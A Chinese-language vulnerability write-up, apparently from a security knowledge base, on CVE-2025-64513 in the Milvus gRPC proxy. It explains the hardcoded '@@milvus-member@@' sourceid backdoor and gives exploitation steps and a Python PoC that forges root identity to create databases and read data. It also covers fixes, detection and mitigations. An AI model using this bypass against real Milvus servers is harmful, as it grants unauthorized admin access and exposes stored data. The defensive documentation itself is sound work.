---
id: web-generic-auth-milvus-sourceid-header-backdoor-fake-identity
title: Milvus sourceid 内部成员后门：base64("@@milvus-member@@") 加伪造 authorization 直接获得 full admin（CVE-2025-64513）
type: scenario
domain: web
path: web/generic/auth
technique: sourceid-member-backdoor-auth-bypass
aliases:
- CVE-2025-64513
- Milvus sourceid 认证绕过
- '@@milvus-member@@ 后门'
- Milvus 伪造 root 身份
- Milvus Proxy 认证绕过
- QEBtaWx2dXMtbWVtYmVyQEA=
tags:
- milvus
- vector-database
- auth-bypass
- sourceid
- grpc
- internal-trust
- fake-identity
- full-admin
cve:
- CVE-2025-64513
severity: critical
confidence: high
affected_versions: < 2.4.24 / < 2.5.21 / < 2.6.5
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V67
  verified_at: '2026-11-05T11:57:56+08:00'
  notes: 已对照原文全文与12张内联截图核对：validSourceID 源码、HeaderSourceID='sourceId'/MemberCredID='@@milvus-member@@'、base64 值 QEBtaWx2dXMtbWVtYmVyQEA=、仅 sourceid 可 ListDatabases、sourceid+base64('root:WrongPassword123') 未认证建 evil_db 并读写 secret 数据、仅假 authorization 被拒，均与原文一致。affected_versions 依原文 advisory 区间设置。未验证点：未实际执行 PoC；frontmatter 无 sources/source_url。
---

## 一句话结论

Milvus 的 gRPC 认证拦截器为内部组件保留了一条免认证分支：请求头 `sourceid` 的 base64 解码值等于硬编码常量 `@@milvus-member@@` 时，整个认证分支被跳过，且 `authorization` 头不再校验、原样透传给内部组件；内部组件只信用户名不验密码，因此未认证攻击者用 `sourceid` 加 `authorization: base64("root:任意假密码")` 就能以 root 身份执行建库、读写数据、列用户等管理操作。

## 原理

- 认证拦截器 `internal/proxy/authentication_interceptor.go` 中的 `validSourceID` 从 `authorization[0]` 取 token，base64 解码后与 `util.MemberCredID` 比较；`MemberCredID` 是硬编码常量 `@@milvus-member@@`（`pkg/util/constant.go`），`HeaderSourceID = "sourceId"`。
- 拦截器逻辑：`AuthorizationEnabled` 为 true 时，若 `validSourceID` 通过，则正常认证分支（校验 authorization 中的 base64(username:password)）被整体跳过；若未通过才走正常校验。
- 这个机制本意是让 Milvus 内部组件互调时自动携带内部成员标识（`internal/util/grpcclient/auth.go` 的 `PerRPCCredentials` 会带 `HeaderSourceID`）。问题在于“内部成员身份”没有任何来源校验，常量硬编码，base64 值谁都能算出来。
- 更关键的是跳过认证后 `authorization` 头被原样透传给内部组件（rootcoord 等）；内部组件从 authorization 解析用户名和密码，但只信任用户名——密码校验发生在 proxy 层，内部组件默认调用方已验证过。于是攻击者可以伪造任意用户名（包括 root），内部组件直接按该身份授权。
- 因此完整链是：`sourceid: base64("@@milvus-member@@")` 让 proxy 放行 → `authorization: base64("root:假密码")` 伪造身份 → 内部组件按 root 授权。全程不需要知道真实密码。
- 细节：gRPC metadata 的 key 必须全小写，服务端查的是 `strings.ToLower(HeaderSourceID)`，所以必须传 `sourceid` 而非 `sourceId`；header 值必须是完整 base64 编码后的字符串，传原始 `@@milvus-member@@` 或 `1` 都不行，这反向印证了“先 base64 解码再比较”的实现。

## 触发条件

- Milvus 版本在受影响区间（< 2.4.24 / < 2.5.21 / < 2.6.5）。
- 已开启认证（`COMMON_SECURITY_AUTHORIZATIONENABLED=true`）；未开认证时本来就匿名可管理，问题更大但不需要本后门。
- 攻击者能访问 19530 proxy gRPC 端口（公网、内网低权限用户、被攻破的旁路服务均可）。
- 不需要任何凭据，只需能构造 gRPC metadata。

## 利用步骤

1. 确认版本与认证状态：未认证调用 `ListDatabases` 应返回 `UNAUTHENTICATED missing authorization in header`。
2. 计算 `base64("@@milvus-member@@")` = `QEBtaWx2dXMtbWVtYmVyQEA=`。
3. 在 gRPC 请求 metadata 中加入 `("sourceid", "QEBtaWx2dXMtbWVtYmVyQEA=")`，再次 `ListDatabases`，应返回 code=0 与数据库列表。
4. 再加入 `("authorization", base64("root:WrongPassword123"))`，调用 `CreateDatabase` 等管理接口，验证建库成功。
5. 用真实 root 登录交叉验证新建的数据库确实存在；继续尝试列用户、建集合、插入、建索引、加载、查询，确认完整读写权限。
6. 对照实验：只带假 authorization 不带 sourceid 应被 `UNAUTHENTICATED auth check failure` 拒绝，证明是 sourceid 放行了整个认证分支。

## PoC

```python
import base64
# 依赖 milvus-proto 生成的 gRPC stub
SOURCEID = base64.b64encode(b"@@milvus-member@@").decode()      # QEBtaWx2dXMtbWVtYmVyQEA=
FAKE_AUTH = base64.b64encode(b"root:WrongPassword123").decode()  # 任意假密码

# 1) 未认证基线
stub.ListDatabases(ListDatabasesRequest())

# 2) 仅 sourceid：绕过认证
stub.ListDatabases(ListDatabasesRequest(),
                   metadata=[("sourceid", SOURCEID)])

# 3) sourceid + 伪造 root：以 root 身份建库
stub.CreateDatabase(CreateDatabaseRequest(db_name="evil_db"),
                    metadata=[("sourceid", SOURCEID),
                              ("authorization", FAKE_AUTH)])
stub.ListDatabases(ListDatabasesRequest(),
                   metadata=[("sourceid", SOURCEID),
                             ("authorization", FAKE_AUTH)])
```

```text
[未认证]            UNAUTHENTICATED missing authorization in header
[仅 sourceid]       code=0 数据库=['default']
[sourceid+假 root]  CreateDatabase code=0；再次列出出现 evil_db
[仅假 authorization] UNAUTHENTICATED auth check failure
```

## 变体与关联

- 变体：sourceid 有效时 API key 分支与用户名密码分支都被跳过，因此不仅能伪造 root，还能伪造任意已存在的用户名/角色，权限模型里有什么身份就能扮演什么身份。
- 变体：2.6.5 的修复是直接删除 `validSourceID` 函数，认证拦截器不再信任任何 sourceid；内部组件互调走内部端口，不经过 proxy 拦截器，因此删掉后集群功能正常。
- 变体：临时缓解是在网关层删除所有请求的 `sourceid` header；但这只挡这一个后门，不改变“内部信任可被外部伪造”的设计问题。
- 关联：同一认证体系的其他缺陷见 [[web-generic-auth-milvus-9091-expr-weak-token-unauth]] 与 [[web-generic-auth-milvus-rootcoord-53100-unauthenticated]]；三者常被串成“公网 19530 + 管理端口 + 容器网络”的完整攻击面。
- 边界：2.6.5 及以上版本已修复；REST API（/v2/vectordb/*）走独立的 GIN 认证链路，本后门只影响 gRPC proxy。

## 检测与防御

- 检测：在 19530 上做未认证基线测试；监控 gRPC metadata 中出现 `sourceid` 或 `QEBtaWx2dXMtbWVtYmVyQEA=` 的请求，尤其是来自外部 IP 的请求。
- 检测：审计认证拦截器版本与源码，确认是否仍存在 `validSourceID`/`MemberCredID` 逻辑；检查是否有服务绕过 proxy 直连内部端口。
- 防御：升级到 2.6.5 及以上；开启认证并修改 root 默认密码；在网关/反向代理层剥离 `sourceid` header 作为临时缓解。
- 防御：不要把 19530 直接暴露公网；对 gRPC 入口做来源白名单与审计；内部组件互调使用独立网络与 mTLS，避免“硬编码成员标识即免认证”的设计。
